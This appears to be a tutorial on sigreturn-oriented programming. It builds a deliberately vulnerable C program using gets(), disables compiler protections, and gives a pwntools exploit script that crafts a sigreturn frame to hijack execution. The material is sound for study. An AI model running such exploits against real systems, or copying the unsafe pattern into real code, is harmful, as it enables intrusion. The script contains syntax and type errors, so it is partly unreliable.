# EXPLOITS
## STACK BUFFER OVERFLOW FOR SIGRETURN ORIENTED PROGRAMMING (ROP)
## REQUIRED TO UNDERSTAND : Stack buffer overflow for return oriented programming
## Can't work if : 
```
> PIE (position independant executable) is enabled
```
## Bypasses protection :
```
> NX (non executable) because we're not executing any shellcode
> ASLR because we don't jump to any libc function but if we need an address we could get some problems
```
There's a linux syscall which is sigreturn, to give a simple overview, it will do this :
1. Pause the program
2. Save a lot of registers and values on the stack : `R8`, `R9`, `R10`, `R11`, `R12`, `R13`, `R14`, `R15`, `RDI`, `RSI`, `RBP`, `RBX`, `RDX`, `RAX`, `RCX`, `RSP`, `RIP` and more...
3. Then it will pop/restore all these values to registers
That looks perfect, it means that if we overwrite all these registers in the stack with values we want for each register we have control on all them, and in theory, it should work, thus with this control on registers we could execute any syscall !  
In 64 bits, the id of SYS_RT_SIGRETURN which is the syscall that allows us to do this is the syscall `15` (`0xF`)  
So let's have a look at the C program :
```
  GNU nano 4.8                                     main.c                                                #include <stdio.h>

void gadgets()
{
        __asm__(
        "pop %rax\n"
        "ret\n"
        "syscall\n"
        "ret");
}

void vuln()
{
        char buffer[64];
        gets(buffer);
}

int main(void)
{
        vuln();
}
```
As you can see i added gadgets, one to control `RAX` and one to execute the syscall
So for the compilation :
```
gcc main.c -o vuln -fno-stack-protector -no-pie
```
So we need the address of the gadgets `pop rax ; ret` and `syscall`
```
ROPgadget --binary <executable> | grep "pop rax ; ret"
```
```
0x000000000040113e : pop rax ; ret
```
So `pop rax ; ret` => 40113e
```
ROPgadget --binary <executable> | grep "syscall"
```
```
0x0000000000401140 : syscall
```
So `syscall` => 0x401140  
Let's build the exploit :
```python
# exploit.py
from pwn import *

context.arch = "amd64"

pop_rax_gadget = 0x000000000040113e
syscall_gadget = 0x0000000000401140

payload = 'A'*<BUFFER SIZE> # (64) fill the buffer
payload += 'B'*<OFFSET BEFORE OVERWRITING RIP> # (for me it was 8 in 64 bits and it's 12 in 32 bits) offset before overwring RIP
payload += p64(pop_rax_gadget) # pop rax ; ret
payload += p64(15) ; rax => 15 (0xf)
payload += p64(syscall_gadget) # syscall

"""
The registers set that is stored in the stack is called a sigreturn frame, in 64 bits it's size is 248 bytes, including all the registers plus other values
With pwntools, there is a class which represents the stack frame, so that's awesome
"""

frame = SigreturnFrame() # crafts a sigreturn frame
# Here we can set all registers by doing : frame.<register> = <value>
# example :
# frame.rax = 60 # SYS_EXIT
# frame.rdi = 5 # Exit code
# frame.rip = syscall_gadget # Do the syscall

payload += bytes(frame) # send sigreturn frame
print(payload)
```
So you can do any syscall you want using registers, so you can get a shell of course
